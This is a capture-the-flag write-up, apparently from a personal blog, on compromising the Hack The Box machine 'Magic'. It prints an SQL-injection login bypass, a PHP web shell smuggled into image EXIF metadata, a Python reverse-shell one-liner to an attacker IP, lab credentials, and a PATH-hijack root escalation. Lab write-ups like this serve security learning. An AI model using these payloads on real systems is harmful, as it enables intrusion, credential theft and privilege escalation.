@@ -1,0 +1,156 @@
+I"X$<p class="lead"><strong><em>“Any sufficiently advanced technology is indistinguishable from magic.”</em></strong> - Arthur C. Clarke</p>
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/machine.jpeg" alt="" /></p>
+
+<ul class="large-only" id="markdown-toc">
+  <li><a href="#machine-matrix" id="markdown-toc-machine-matrix">Machine Matrix</a></li>
+  <li><a href="#machine-summary" id="markdown-toc-machine-summary">Machine Summary</a></li>
+  <li><a href="#nmap-scan" id="markdown-toc-nmap-scan">Nmap Scan</a></li>
+  <li><a href="#enumeration-on-port-80" id="markdown-toc-enumeration-on-port-80">Enumeration on port 80</a></li>
+  <li><a href="#bypassing-authentication-through-sqli" id="markdown-toc-bypassing-authentication-through-sqli">Bypassing Authentication Through SQLI</a></li>
+  <li><a href="#acquiring-initial-foothold-as-www-data" id="markdown-toc-acquiring-initial-foothold-as-www-data">Acquiring Initial Foothold as www-data</a></li>
+  <li><a href="#acquiring-user-shell---theseus" id="markdown-toc-acquiring-user-shell---theseus">Acquiring User Shell - Theseus</a></li>
+  <li><a href="#acquiring-root-privileges" id="markdown-toc-acquiring-root-privileges">Acquiring Root Privileges</a></li>
+</ul>
+
+<h2 id="machine-matrix">Machine Matrix</h2>
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/matrix.png" alt="" /></p>
+
+<h2 id="machine-summary">Machine Summary</h2>
+<p>Box is a linux machine that has a webserver running whose authentication can be bypassed through SQL Injection. There is a file upload functionality that can be bypassed which grants the low privileged shell. There is a php file which has stored credentials for mysqlservice, we can get the user credentials through accessing the tables. Replacing the fdisk file malicious file (reverse shell) and adding the path grants the root privilege as sysinfo binary indirectly pulls fdisk.</p>
+
+<h2 id="nmap-scan">Nmap Scan</h2>
+<p>I started the enumeration with nmap scan</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.10.185
+</code></pre></div></div>
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/nmap.png" alt="" /></p>
+
+<p>The box had two ports open</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Port</th>
+      <th style="text-align: left">Service</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">Apache</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="enumeration-on-port-80">Enumeration on port 80</h2>
+<p>I ran dirbuster that revealed a folder /images/uploads but it was forbidden</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/1.png" alt="" /></p>
+
+<p>But the contents and files of the folder can be accessed</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/2.png" alt="" /></p>
+
+<p>I guessed the inital foothold path i.e i need to find a way to upload a file ( that contains the shell code) and trigger it. I started enumerating on the web application.</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/4.png" alt="" /></p>
+
+<h2 id="bypassing-authentication-through-sqli">Bypassing Authentication Through SQLI</h2>
+<p>Application had a login page and the authentication can be bypassed through SQL Injection.</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/5.png" alt="" /></p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/6.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'or'1'='1
+</code></pre></div></div>
+<p>There is a upload functionality so i tried to put a webshell but i wasn’t able to directly upload it. I also tried to bypass upload restrictions through changing the extension of the file to .php.png and content type from application to image/png but that also failed.</p>
+
+<h2 id="acquiring-initial-foothold-as-www-data">Acquiring Initial Foothold as www-data</h2>
+<p>Upon researching a bit, i found a way to add a malicious code (web-shell) to meta data of a image file through using exif tool.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exiftool <span class="nt">-Comment</span><span class="o">=</span><span class="s1">'&lt;?php echo "&lt;pre&gt;"; system($_GET['</span>cmd<span class="s1">']); ?&gt;'</span> file.jpg <span class="p">;</span> <span class="nb">mv </span>file.jpg file.php.jpg
+</code></pre></div></div>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/8.png" alt="" /></p>
+
+<p>Upon loading the file on browser, it looks like crap.</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/9.png" alt="" /></p>
+
+<p>Upon viewing on Burp, it made sense.</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/10.png" alt="" /></p>
+
+<p>In order to get a proper reverse shell, i decided to upload a php reverse shell and triger that</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://<span class="o">{</span>IP<span class="o">}</span>/<span class="o">{</span>PORT<span class="o">}</span>
+</code></pre></div></div>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/11.png" alt="" /></p>
+
+<p>I started the listener on my attacking machine</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> <span class="o">{</span>PORT<span class="o">}</span>
+</code></pre></div></div>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/13.png" alt="" /></p>
+
+<p>I got the initial foothold as www-data.</p>
+
+<h2 id="acquiring-user-shell---theseus">Acquiring User Shell - Theseus</h2>
+
+<p>Upon enumerating the directories i found a juicy file <strong>db.php</strong> in the directory <strong>/var/www/Magic</strong>. The file had credentials of the user <strong>theseus</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dbUsername = theseus
+dbPassword = iamkingtheseus
+</code></pre></div></div>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/14.png" alt="" /></p>
+
+<p>I tried to login over MySQL Service and SSH but both failed.</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/15.png" alt="" /></p>
+
+<p>Upon researching a bit got to know about the command <strong>mysqldump</strong> that is used to backup, restore and dump the database.</p>
+
+<p>I used that to dump the entire Magic database</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysqldump <span class="nt">-u</span> theseus <span class="nt">-p</span> Magic
+</code></pre></div></div>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/16.png" alt="" /></p>
+
+<p>I got a new set of credentials for the user theseus</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username: admin
+password: Th3s3usW4sK1ng
+</code></pre></div></div>
+
+<p>I tried to login into the theseus account using the obtained password over ssh. I got the user shell</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/18.png" alt="" /></p>
+
+<h2 id="acquiring-root-privileges">Acquiring Root Privileges</h2>
+<p>I ran linPeas that gave some information, sysinfo belongs to the root but can be executed by the user theseus. I executed the sysinfo command, it displayed more information then a normal sysinfo command would. After researching a bit, I found that information that gets revealed while executing fdisk command also revealed while executing sysinfo in the machine. <strong>binary fdisk is getting executed indirectly when sysinfo is executed</strong></p>
+
+<p>I created a python script that would grant me the reverse shell with the name <strong>fdisk</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.54",8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+</code></pre></div></div>
+
+<p>I downloaded the file in the victim machine at tmp directory but when sysinfo gets executed fdisk in the bin directory gets executed. so i need to set the path to tmp directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp/:<span class="nv">$PATH</span>
+</code></pre></div></div>
+
+<p>I started the listener in my attacker machine and again executed sysinfo, fdisk in the /tmp/ directory got executed and i got the reverse shell with root privileges.</p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/20.png" alt="" /></p>
+
+<p><img src="https://r3dw0lfsec.in/assets/img/blog/HTB/magic/pwned.png" alt="" /></p>
+
+<p>Happy Hacking !</p>
+:ET
